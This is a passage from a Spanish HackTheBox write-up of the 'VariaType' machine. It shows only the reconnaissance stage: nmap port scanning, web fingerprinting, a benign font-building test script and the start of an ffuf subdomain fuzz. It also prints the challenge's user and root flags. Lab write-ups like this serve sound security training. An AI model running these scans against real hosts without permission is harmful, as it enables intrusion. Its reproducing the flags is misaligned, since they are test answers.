@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <title>
+  VariaType · 0xjustgr0w
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="David León">
+<meta name="description" content="
+  VariaType — Intrusión Completa
+  
+    
+    Link to heading
+  
+
+
+Dificultad: Medium
+Plataforma: HackTheBox
+Flags: 758e85ba26b1aa169b615a57c7b145ca (user) / 60940e678e94265f3a75a6c8c4f9c678 (root)
+
+
+  Reconocimiento
+  
+    
+    Link to heading
+  
+
+
+  Descubrimiento de puertos
+  
+    
+    Link to heading
+  
+
+Comenzamos verificando conectividad con la máquina:
+❯ ping -c1 10.129.31.153
+PING 10.129.31.153 (10.129.31.153) 56(84) bytes of data.
+64 bytes from 10.129.31.153: icmp_seq=1 ttl=63 time=76.2 ms
+TTL de 63 — Linux. Escaneamos todos los puertos:
+❯ nmap -p- --open -sS --min-rate 5000 -sCV 10.129.31.153 -oG nmap/targeted -n -Pn
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-19 11:39 -0400
+Nmap scan report for 10.129.31.153
+Host is up (0.093s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2&#43;deb12u7
+80/tcp open  http    nginx 1.22.1
+|_http-title: Did not follow redirect to http://variatype.htb/
+Dos puertos: SSH (22) y HTTP (80) con nginx 1.22.1. El servicio web redirige a variatype.htb, asique agregamos el dominio al /etc/hosts:">
+<meta name="keywords" content="blog,hacking,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="VariaType">
+  <meta name="twitter:description" content="VariaType — Intrusión CompletaLink to headingDificultad: Medium
+Plataforma: HackTheBox
+Flags: 758e85ba26b1aa169b615a57c7b145ca (user) / 60940e678e94265f3a75a6c8c4f9c678 (root)
+ReconocimientoLink to headingDescubrimiento de puertosLink to headingComenzamos verificando conectividad con la máquina:
+❯ ping -c1 10.129.31.153 PING 10.129.31.153 (10.129.31.153) 56(84) bytes of data. 64 bytes from 10.129.31.153: icmp_seq=1 ttl=63 time=76.2 ms TTL de 63 — Linux. Escaneamos todos los puertos:
+❯ nmap -p- --open -sS --min-rate 5000 -sCV 10.129.31.153 -oG nmap/targeted -n -Pn Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-19 11:39 -0400 Nmap scan report for 10.129.31.153 Host is up (0.093s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2&#43;deb12u7 80/tcp open http nginx 1.22.1 |_http-title: Did not follow redirect to http://variatype.htb/ Dos puertos: SSH (22) y HTTP (80) con nginx 1.22.1. El servicio web redirige a variatype.htb, asique agregamos el dominio al /etc/hosts:">
+
+<meta property="og:url" content="http://daveey.github.io/posts/variatype/">
+  <meta property="og:site_name" content="0xjustgr0w">
+  <meta property="og:title" content="VariaType">
+  <meta property="og:description" content="VariaType — Intrusión CompletaLink to headingDificultad: Medium
+Plataforma: HackTheBox
+Flags: 758e85ba26b1aa169b615a57c7b145ca (user) / 60940e678e94265f3a75a6c8c4f9c678 (root)
+ReconocimientoLink to headingDescubrimiento de puertosLink to headingComenzamos verificando conectividad con la máquina:
+❯ ping -c1 10.129.31.153 PING 10.129.31.153 (10.129.31.153) 56(84) bytes of data. 64 bytes from 10.129.31.153: icmp_seq=1 ttl=63 time=76.2 ms TTL de 63 — Linux. Escaneamos todos los puertos:
+❯ nmap -p- --open -sS --min-rate 5000 -sCV 10.129.31.153 -oG nmap/targeted -n -Pn Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-19 11:39 -0400 Nmap scan report for 10.129.31.153 Host is up (0.093s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2&#43;deb12u7 80/tcp open http nginx 1.22.1 |_http-title: Did not follow redirect to http://variatype.htb/ Dos puertos: SSH (22) y HTTP (80) con nginx 1.22.1. El servicio web redirige a variatype.htb, asique agregamos el dominio al /etc/hosts:">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-21T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-21T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Medium">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="FontForge">
+    <meta property="article:tag" content="CVE-2025-47273">
+      <meta property="og:see_also" content="http://daveey.github.io/posts/principal/">
+      <meta property="og:see_also" content="http://daveey.github.io/posts/snapped/">
+      <meta property="og:see_also" content="http://daveey.github.io/posts/cap/">
+      <meta property="og:see_also" content="http://daveey.github.io/posts/puppy/">
+
+
+
+
+<link rel="canonical" href="http://daveey.github.io/posts/variatype/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.022594d625780e2edf64581b893d32cb35c11de5d88953ea4ad3c2e45451e214.css" integrity="sha256-AiWU1iV4Di7fZFgbiT0yyzXBHeXYiVPqStPC5FRR4hQ=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://daveey.github.io/">
+      0xjustgr0w
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">Sobre mí</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Proyectos</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/contact/">Contáctame</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://daveey.github.io/posts/variatype/">
+              VariaType
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2026-06-21T00:00:00Z">
+                junio 21, 2026
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              9 minutos de lectura.
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/0xjustgr0w/">0xjustgr0w</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/categories/pentesting/">Pentesting</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/ctf/">CTF</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/medium/">Medium</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/hackthebox/">HackTheBox</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/fontforge/">FontForge</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/cve-2025-47273/">CVE-2025-47273</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h1 id="variatype--intrusión-completa">
+  VariaType — Intrusión Completa
+  <a class="heading-link" href="#variatype--intrusi%c3%b3n-completa">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><img src="/images/posts/variatype/target.png" alt=""></p>
+<p><strong>Dificultad</strong>: <em>Medium</em></p>
+<p><strong>Plataforma</strong>: <em>HackTheBox</em></p>
+<p><strong>Flags</strong>: <code>758e85ba26b1aa169b615a57c7b145ca</code> (user) / <code>60940e678e94265f3a75a6c8c4f9c678</code> (root)</p>
+<hr>
+<h2 id="reconocimiento">
+  Reconocimiento
+  <a class="heading-link" href="#reconocimiento">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<h3 id="descubrimiento-de-puertos">
+  Descubrimiento de puertos
+  <a class="heading-link" href="#descubrimiento-de-puertos">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Comenzamos verificando conectividad con la máquina:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ping</span> <span class="o">-</span><span class="n">c1</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">31</span><span class="o">.</span><span class="mi">153</span>
+</span></span><span class="line"><span class="cl"><span class="no">PING</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">31</span><span class="o">.</span><span class="mi">153</span> <span class="p">(</span><span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">31</span><span class="o">.</span><span class="mi">153</span><span class="p">)</span> <span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span> <span class="n">bytes</span> <span class="n">of</span> <span class="n">data</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="n">bytes</span> <span class="n">from</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">31</span><span class="o">.</span><span class="mi">153</span><span class="p">:</span> <span class="n">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="n">ttl</span><span class="o">=</span><span class="mi">63</span> <span class="n">time</span><span class="o">=</span><span class="mi">76</span><span class="o">.</span><span class="mi">2</span> <span class="n">ms</span></span></span></code></pre></div>
+<p>TTL de 63 — Linux. Escaneamos todos los puertos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">sCV</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">31</span><span class="o">.</span><span class="mi">153</span> <span class="o">-</span><span class="n">oG</span> <span class="n">nmap</span><span class="o">/</span><span class="n">targeted</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span>
+</span></span><span class="line"><span class="cl"><span class="no">Starting</span> <span class="no">Nmap</span> <span class="mi">7</span><span class="o">.</span><span class="mi">99</span> <span class="p">(</span> <span class="ss">https</span><span class="p">:</span><span class="sr">//nm</span><span class="n">ap</span><span class="o">.</span><span class="n">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2026</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">19</span> <span class="mi">11</span><span class="p">:</span><span class="mi">39</span> <span class="o">-</span><span class="mo">0400</span>
+</span></span><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">31</span><span class="o">.</span><span class="mi">153</span>
+</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mi">093</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mi">9</span><span class="o">.</span><span class="mi">2</span><span class="n">p1</span> <span class="no">Debian</span> <span class="mi">2</span><span class="o">+</span><span class="n">deb12u7</span>
+</span></span><span class="line"><span class="cl"><span class="mi">80</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="n">nginx</span> <span class="mi">1</span><span class="o">.</span><span class="mi">22</span><span class="o">.</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title</span><span class="p">:</span> <span class="no">Did</span> <span class="ow">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">variatype</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span></span></span></code></pre></div>
+<p>Dos puertos: <strong>SSH (22)</strong> y <strong>HTTP (80)</strong> con nginx 1.22.1. El servicio web redirige a <code>variatype.htb</code>, asique agregamos el dominio al <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">echo</span> <span class="o">-</span><span class="n">e</span> <span class="s2">&#34;10.129.31.153</span><span class="se">\t\t</span><span class="s2">variatype.htb&#34;</span> <span class="o">|</span> <span class="n">sudo</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="sr">/etc/</span><span class="n">hosts</span></span></span></code></pre></div>
+<h3 id="reconocimiento-web--variatypehtb-flask">
+  Reconocimiento web — variatype.htb (Flask)
+  <a class="heading-link" href="#reconocimiento-web--variatypehtb-flask">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">whatweb</span> <span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">variatype</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="ss">http</span><span class="p">:</span><span class="sr">//</span><span class="n">variatype</span><span class="o">.</span><span class="n">htb</span> <span class="o">[</span><span class="mi">200</span> <span class="no">OK</span><span class="o">]</span> <span class="no">Title</span><span class="o">[</span><span class="no">VariaType</span> <span class="no">Labs</span> <span class="err">—</span> <span class="no">Variable</span> <span class="no">Font</span> <span class="no">Generator</span><span class="o">]</span><span class="p">,</span> <span class="n">nginx</span><span class="o">[</span><span class="mi">1</span><span class="o">.</span><span class="mi">22</span><span class="o">.</span><span class="mi">1</span><span class="o">]</span></span></span></code></pre></div>
+<p><img src="/images/posts/variatype/VariaType%20Portal.png" alt=""></p>
+<p>El sitio principal es una aplicación <strong>Flask</strong> llamada <strong>VariaType Labs — Variable Font Generator</strong>. Permite subir archivos <code>.designspace</code> (XML) junto con fuentes <code>.ttf</code> para generar fuentes variables mediante <code>fontTools.varLib</code>. El endpoint clave es <code>/tools/variable-font-generator/process</code>.</p>
+<p>Probamos la funcionalidad generando fuentes maestras y un <code>.designspace</code> de prueba con Python:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fontTools.fontBuilder</span> <span class="kn">import</span> <span class="n">FontBuilder</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">fontTools.pens.ttGlyphPen</span> <span class="kn">import</span> <span class="n">TTGlyphPen</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">crear_fuente_maestra</span><span class="p">(</span><span class="n">nombre_archivo</span><span class="p">,</span> <span class="n">grosor_linea</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fb</span> <span class="o">=</span> <span class="n">FontBuilder</span><span class="p">(</span><span class="n">unitsPerEm</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span> <span class="n">isTTF</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fb</span><span class="o">.</span><span class="n">setupNameTable</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;familyName&#39;</span><span class="p">:</span> <span class="s1">&#39;EjemploVariable&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;styleName&#39;</span><span class="p">:</span> <span class="n">nombre_archivo</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;.ttf&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;uniqueFontIdentifier&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;EjemploVariable-</span><span class="si">{</span><span class="n">nombre_archivo</span><span class="si">}</span><span class="s1">:2026&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;fullName&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;EjemploVariable </span><span class="si">{</span><span class="n">nombre_archivo</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;version&#39;</span><span class="p">:</span> <span class="s1">&#39;Version 1.000&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span> <span class="o">=</span> <span class="n">TTGlyphPen</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">moveTo</span><span class="p">((</span><span class="mi">100</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">lineTo</span><span class="p">((</span><span class="mi">500</span><span class="p">,</span> <span class="mi">800</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">lineTo</span><span class="p">((</span><span class="mi">900</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">lineTo</span><span class="p">((</span><span class="mi">900</span> <span class="o">-</span> <span class="n">grosor_linea</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">lineTo</span><span class="p">((</span><span class="mi">500</span><span class="p">,</span> <span class="mi">800</span> <span class="o">-</span> <span class="n">grosor_linea</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">lineTo</span><span class="p">((</span><span class="mi">100</span> <span class="o">+</span> <span class="n">grosor_linea</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">closePath</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">moveTo</span><span class="p">((</span><span class="mi">300</span><span class="p">,</span> <span class="mi">300</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">lineTo</span><span class="p">((</span><span class="mi">700</span><span class="p">,</span> <span class="mi">300</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">lineTo</span><span class="p">((</span><span class="mi">700</span><span class="p">,</span> <span class="mi">300</span> <span class="o">+</span> <span class="n">grosor_linea</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">lineTo</span><span class="p">((</span><span class="mi">300</span><span class="p">,</span> <span class="mi">300</span> <span class="o">+</span> <span class="n">grosor_linea</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen</span><span class="o">.</span><span class="n">closePath</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">glyph</span> <span class="o">=</span> <span class="n">pen</span><span class="o">.</span><span class="n">glyph</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pen_notdef</span> <span class="o">=</span> <span class="n">TTGlyphPen</span><span class="p">(</span><span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">glyph_notdef</span> <span class="o">=</span> <span class="n">pen_notdef</span><span class="o">.</span><span class="n">glyph</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">glyphs</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;.notdef&#39;</span><span class="p">:</span> <span class="n">glyph_notdef</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="p">:</span> <span class="n">glyph</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fb</span><span class="o">.</span><span class="n">setupGlyf</span><span class="p">(</span><span class="n">glyphs</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">orden_glifos</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;.notdef&#39;</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fb</span><span class="o">.</span><span class="n">setupGlyphOrder</span><span class="p">(</span><span class="n">orden_glifos</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">metrics</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;.notdef&#39;</span><span class="p">:</span> <span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="s1">&#39;A&#39;</span><span class="p">:</span> <span class="p">(</span><span class="mi">1000</span><span class="p">,</span> <span class="mi">100</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fb</span><span class="o">.</span><span class="n">setupHorizontalMetrics</span><span class="p">(</span><span class="n">metrics</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fb</span><span class="o">.</span><span class="n">setupCharacterMap</span><span class="p">({</span><span class="mh">0x41</span><span class="p">:</span> <span class="s1">&#39;A&#39;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fb</span><span class="o">.</span><span class="n">setupPost</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fb</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">nombre_archivo</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Fuente creada: </span><span class="si">{</span><span class="n">nombre_archivo</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">crear_fuente_maestra</span><span class="p">(</span><span class="s2">&#34;Master-Regular.ttf&#34;</span><span class="p">,</span> <span class="n">grosor_linea</span><span class="o">=</span><span class="mi">60</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">crear_fuente_maestra</span><span class="p">(</span><span class="s2">&#34;Master-Bold.ttf&#34;</span><span class="p">,</span> <span class="n">grosor_linea</span><span class="o">=</span><span class="mi">180</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">designspace_content</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;&lt;?xml version=&#39;1.0&#39; encoding=&#39;UTF-8&#39;?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;designspace version=&#34;4.1&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;axes&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;axis tag=&#34;wght&#34; name=&#34;Weight&#34; minimum=&#34;400&#34; maximum=&#34;700&#34; default=&#34;400&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;/axes&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;sources&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;source filename=&#34;Master-Regular.ttf&#34; name=&#34;Regular&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;location&gt;&lt;dimension name=&#34;Weight&#34; xvalue=&#34;400&#34; /&gt;&lt;/location&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/source&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;source filename=&#34;Master-Bold.ttf&#34; name=&#34;Bold&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;location&gt;&lt;dimension name=&#34;Weight&#34; xvalue=&#34;700&#34; /&gt;&lt;/location&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/source&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;/sources&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;instances&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;instance familyname=&#34;EjemploVariable&#34; stylename=&#34;Medium&#34; filename=&#34;instance/EjemploVariable-Medium.ttf&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;location&gt;&lt;dimension name=&#34;Weight&#34; xvalue=&#34;550&#34; /&gt;&lt;/location&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/instance&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">  &lt;/instances&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/designspace&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;example.designspace&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">designspace_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Archivo XML &#39;example.designspace&#39; creado con exito.&#34;</span><span class="p">)</span></span></span></code></pre></div>
+<p><img src="/images/posts/variatype/testing%20func.png" alt=""></p>
+<p>El sitio procesa los archivos correctamente y nos permite descargar la fuente generada. Esto confirma que <code>fontTools.varLib</code> esta activo. Ahora debemos buscar mas superficie de ataque.</p>
+<h3 id="descubrimiento-de-subdominios">
+  Descubrimiento de subdominios
+  <a class="heading-link" href="#descubrimiento-de-subdominios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<p>Fuzzeamos subdominios virtuales con ffuf:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">-</span><span class="n">u</span> <span class="s2">&#34;http://variatype.htb/&#34;</span> <span class="o">-</span><span class="n">H</span> <span class="s2">&#34;Host: FUZZ.variatype.htb&#34;</span> <span class="p">\</span>
